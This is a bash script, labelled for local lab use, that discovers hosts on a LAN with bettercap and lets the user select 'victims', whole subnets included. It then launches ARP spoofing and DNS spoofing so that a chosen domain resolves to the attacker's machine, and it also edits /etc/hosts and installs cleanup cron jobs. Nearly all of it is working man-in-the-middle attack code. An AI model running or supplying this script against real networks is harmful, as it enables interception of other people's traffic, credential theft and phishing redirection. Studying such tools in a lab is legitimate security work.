#!/bin/bash
# ─────────────────────────────────────────────
#  LAN Scanner + Hosts Mapper + ARP/DNS Spoofer
#  LOCAL LAB USE ONLY
# ─────────────────────────────────────────────

INTERFACE="wlan0"
HOSTS_FILE="/etc/hosts"
HOSTNAME_TARGET="kali"
CLEAN_HOSTS="/etc/hosts.clean"
LOGFILE="/var/log/hosts_cleanup.log"
CRON_SCRIPT="/usr/local/bin/hosts_cleanup.sh"

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | sudo tee -a "$LOGFILE"; }

# ── trap keyboard interrupt + exit ────────────
trap cleanup_and_exit SIGINT SIGTERM EXIT

cleanup_and_exit() {
    echo ""
    log "[*] Caught exit/interrupt — running cleanup..."
    stop_bettercap
    restore_hosts
    restore_hostname
    log "[+] Cleanup done. Exiting."
    exit 0
}

# ── stop bettercap + flush ARP ────────────────
stop_bettercap() {
    if pgrep -x bettercap > /dev/null; then
        log "[*] Stopping bettercap..."
        sudo pkill -x bettercap
        sleep 2
        sudo arp -d -a 2>/dev/null
        sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"
        sudo sh -c "echo 0 > /proc/sys/net/ipv4/conf/$INTERFACE/send_redirects"
        log "[+] bettercap stopped + ARP flushed + IP forward disabled"
    else
        log "[+] bettercap not running"
    fi
}

# ── restore /etc/hosts ────────────────────────
restore_hosts() {
    log "[*] Restoring /etc/hosts..."
    if [ -f "$CLEAN_HOSTS" ]; then
        sudo cp "$CLEAN_HOSTS" "$HOSTS_FILE"
        log "[+] Restored from clean baseline $CLEAN_HOSTS"
    else
        sudo awk '
            /^127\.0\.0\.1/ {print; next}
            /^127\.0\.1\.1/ {print; next}
            /^::1/          {print; next}
            /^ff02::/       {print; next}
            /^#/            {print; next}
            /^$/            {print; next}
            /^192\.168\./   {next}
            {print}
        ' "$HOSTS_FILE" | sudo tee "${HOSTS_FILE}.tmp" > /dev/null
        sudo mv "${HOSTS_FILE}.tmp" "$HOSTS_FILE"
        log "[+] Stripped LAN entries from $HOSTS_FILE"
    fi
}

# ── restore hostname ──────────────────────────
restore_hostname() {
    CURRENT=$(hostname)
    if [ "$CURRENT" != "$HOSTNAME_TARGET" ]; then
        log "[*] Hostname is '$CURRENT' — resetting to '$HOSTNAME_TARGET'"
        sudo hostnamectl set-hostname "$HOSTNAME_TARGET"
        if ! grep -q "127.0.1.1.*$HOSTNAME_TARGET" "$HOSTS_FILE"; then
            sudo sed -i "/^127\.0\.1\.1/d" "$HOSTS_FILE"
            echo "127.0.1.1 $HOSTNAME_TARGET" | sudo tee -a "$HOSTS_FILE" > /dev/null
        fi
        log "[+] Hostname restored to '$HOSTNAME_TARGET'"
    else
        log "[+] Hostname already '$HOSTNAME_TARGET'"
    fi
}

# ── save clean baseline ───────────────────────
save_clean_baseline() {
    if [ ! -f "$CLEAN_HOSTS" ]; then
        sudo cp "$HOSTS_FILE" "$CLEAN_HOSTS"
        log "[+] Clean baseline saved -> $CLEAN_HOSTS"
    fi
}

# ── install cron ──────────────────────────────
install_cron() {
    sudo tee "$CRON_SCRIPT" > /dev/null << 'CRONSCRIPT'
#!/bin/bash
HOSTS_FILE="/etc/hosts"
CLEAN_HOSTS="/etc/hosts.clean"
HOSTNAME_TARGET="kali"
LOGFILE="/var/log/hosts_cleanup.log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOGFILE"; }
log "[*] Reboot cleanup triggered"
if [ -f "$CLEAN_HOSTS" ]; then
    cp "$CLEAN_HOSTS" "$HOSTS_FILE"
    log "[+] Hosts restored from baseline"
else
    awk '
        /^127\.0\.0\.1/ {print; next}
        /^127\.0\.1\.1/ {print; next}
        /^::1/          {print; next}
        /^ff02::/       {print; next}
        /^#/            {print; next}
        /^$/            {print; next}
        /^192\.168\./   {next}
        {print}
    ' "$HOSTS_FILE" > "${HOSTS_FILE}.tmp" && mv "${HOSTS_FILE}.tmp" "$HOSTS_FILE"
    log "[+] Stripped LAN entries"
fi
CURRENT=$(hostname)
if [ "$CURRENT" != "$HOSTNAME_TARGET" ]; then
    hostnamectl set-hostname "$HOSTNAME_TARGET"
    if ! grep -q "127.0.1.1.*$HOSTNAME_TARGET" "$HOSTS_FILE"; then
        sed -i "/^127\.0\.1\.1/d" "$HOSTS_FILE"
        echo "127.0.1.1 $HOSTNAME_TARGET" >> "$HOSTS_FILE"
    fi
    log "[+] Hostname restored to '$HOSTNAME_TARGET'"
fi
echo 0 > /proc/sys/net/ipv4/ip_forward
log "[+] Reboot cleanup complete"
CRONSCRIPT

    sudo chmod +x "$CRON_SCRIPT"
    ( sudo crontab -l 2>/dev/null | grep -v "hosts_cleanup"; \
      echo "@reboot $CRON_SCRIPT" ) | sudo crontab -
    ( sudo crontab -l 2>/dev/null | grep -v "hosts_cleanup daily"; \
      echo "0 0 * * * $CRON_SCRIPT  # hosts_cleanup daily" ) | sudo crontab -
    log "[+] Cron jobs installed: @reboot + daily midnight"
}

# ── 1. Get own wlan0 IP ───────────────────────
IP=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
if [ -z "$IP" ]; then
    echo "[!] Could not get IP for $INTERFACE"
    exit 1
fi
SUBNET=$(echo "$IP" | grep -oP '^\d+\.\d+\.\d+')".0/24"
echo "[+] $INTERFACE IP : $IP"
echo "[+] Subnet        : $SUBNET"

# ── 2. First run — save baseline + install cron ─
if [ ! -f "$CLEAN_HOSTS" ]; then
    echo "[*] First run — saving clean baseline + installing cron..."
    save_clean_baseline
    install_cron
fi

# ── 3. Ask hostname FIRST ─────────────────────
echo ""
read -p "Enter hostname to spoof (e.g. example.com): " HOSTNAME
if [ -z "$HOSTNAME" ]; then
    echo "[!] Hostname cannot be empty"
    exit 1
fi
echo "[+] Will map: $HOSTNAME -> $IP (this machine)"

# ── 4. Scan with bettercap ────────────────────
echo ""
echo "[*] Scanning LAN via bettercap (~10s)..."
OUTPUT=$(sudo bettercap -iface "$INTERFACE" \
    -eval "net.probe on; sleep 8; net.show; exit" 2>&1)

# ── 5. Parse discovered hosts ─────────────────
declare -A HOST_MAP
declare -a HOST_IPS

while IFS= read -r line; do
    if echo "$line" | grep -qP '│'; then
        ROW_IP=$(echo "$line"  | grep -oP '\b(?!0\.)\d{1,3}(\.\d{1,3}){3}\b' | head -1)
        ROW_MAC=$(echo "$line" | grep -oP '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
        if [[ -n "$ROW_IP" && "$ROW_IP" != "$IP" ]]; then
            HOST_MAP["$ROW_IP"]="${ROW_MAC:-unknown}"
            HOST_IPS+=("$ROW_IP")
        fi
    fi
done <<< "$OUTPUT"

if [ ${#HOST_IPS[@]} -eq 0 ]; then
    while IFS= read -r found_ip; do
        [[ "$found_ip" == "$IP" ]] && continue
        HOST_MAP["$found_ip"]="unknown"
        HOST_IPS+=("$found_ip")
    done < <(echo "$OUTPUT" | grep -oP '\b(?!0\.)\d{1,3}(\.\d{1,3}){3}\b' | sort -u)
fi

if [ ${#HOST_IPS[@]} -eq 0 ]; then
    echo "[!] No hosts discovered. Try increasing sleep time or check interface."
    exit 1
fi

# ── 6. Display hosts + victim selection ───────
echo ""
echo "=== Discovered Hosts ==="
echo ""
printf "  [%s] %-18s  %s\n" "0" "ENTIRE SUBNET" "$SUBNET"
echo ""
INDEX=1
for h in "${HOST_IPS[@]}"; do
    printf "  [%d] %-18s  MAC: %s\n" "$INDEX" "$h" "${HOST_MAP[$h]}"
    (( INDEX++ ))
done

echo ""
read -p "Select victim(s) [0=subnet, 1-${#HOST_IPS[@]}=single, 1,3,4=multi, Enter=skip]: " CHOICE

# ── 7. Resolve victim selection ───────────────
VICTIM_IPS=()
VICTIM_MACS=()
ARP_TARGET=""

if [[ "$CHOICE" == "0" ]]; then
    ARP_TARGET="$SUBNET"
    echo "[+] Target: entire subnet $SUBNET"

elif [[ -n "$CHOICE" ]]; then
    IFS=',' read -ra SELECTIONS <<< "$CHOICE"
    for SEL in "${SELECTIONS[@]}"; do
        SEL=$(echo "$SEL" | xargs)
        if [[ "$SEL" =~ ^[0-9]+$ ]] && (( SEL >= 1 && SEL <= ${#HOST_IPS[@]} )); then
            V_IP="${HOST_IPS[$((SEL-1))]}"
            V_MAC="${HOST_MAP[$V_IP]}"
            VICTIM_IPS+=("$V_IP")
            VICTIM_MACS+=("$V_MAC")
        else
            echo "[!] Invalid selection: $SEL — skipping"
        fi
    done

    if [ ${#VICTIM_IPS[@]} -eq 0 ]; then
        echo "[!] No valid victims selected"
        exit 1
    fi

    ARP_TARGET=$(IFS=','; echo "${VICTIM_IPS[*]}")
    echo ""
    echo "[+] Selected victim(s):"
    for i in "${!VICTIM_IPS[@]}"; do
        printf "    %-18s  MAC: %s\n" "${VICTIM_IPS[$i]}" "${VICTIM_MACS[$i]}"
    done
fi

# ── 8. Update /etc/hosts (map to OUR IP) ──────
echo ""
echo "[*] Updating /etc/hosts..."
sudo cp "$HOSTS_FILE" "${HOSTS_FILE}.bak"

sudo awk '
    /^127\.0\.0\.1/ {print; next}
    /^127\.0\.1\.1/ {print; next}
    /^::1/          {print; next}
    /^ff02::/       {print; next}
    /^#/            {print; next}
    /^$/            {print; next}
    /^192\.168\./   {next}
    {print}
' "$HOSTS_FILE" | sudo tee "${HOSTS_FILE}.tmp" > /dev/null
sudo mv "${HOSTS_FILE}.tmp" "$HOSTS_FILE"
echo "$IP $HOSTNAME" | sudo tee -a "$HOSTS_FILE" > /dev/null
log "[+] /etc/hosts updated: $HOSTNAME -> $IP"

# ── 9. Summary ────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  ATTACKER : $IP ($INTERFACE)"
echo "  SPOOF    : $HOSTNAME -> $IP"
if [[ "$CHOICE" == "0" ]]; then
    echo "  VICTIMS  : entire subnet $SUBNET"
elif [[ -n "$CHOICE" ]]; then
    for i in "${!VICTIM_IPS[@]}"; do
        printf "  VICTIM%-2s : %-18s MAC: %s\n" \
            "$((i+1))" "${VICTIM_IPS[$i]}" "${VICTIM_MACS[$i]}"
    done
else
    echo "  VICTIMS  : none selected"
fi
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ── 10. Launch ARP + DNS spoof ────────────────
if [[ -n "$ARP_TARGET" ]]; then
    echo ""
    echo "[*] Enabling IP forwarding..."
    sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

    echo "[*] Launching bettercap — press Ctrl+C to stop and auto-cleanup"
    echo ""

    # single bettercap session — ARP + DNS together
    sudo bettercap -iface "$INTERFACE" \
        -eval "set arp.spoof.targets $ARP_TARGET; arp.spoof on; set dns.spoof.domains $HOSTNAME; dns.spoof on"

else
    echo ""
    echo "[*] No ARP target set. /etc/hosts updated only."
    echo "[*] Press Ctrl+C to restore and exit."
    read -r -d '' _ </dev/tty
fi

# ── 11. MAC summary ───────────────────────────
echo ""
echo "=== All MACs Seen ==="
echo "$OUTPUT" | grep -oP '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sort -u
echo ""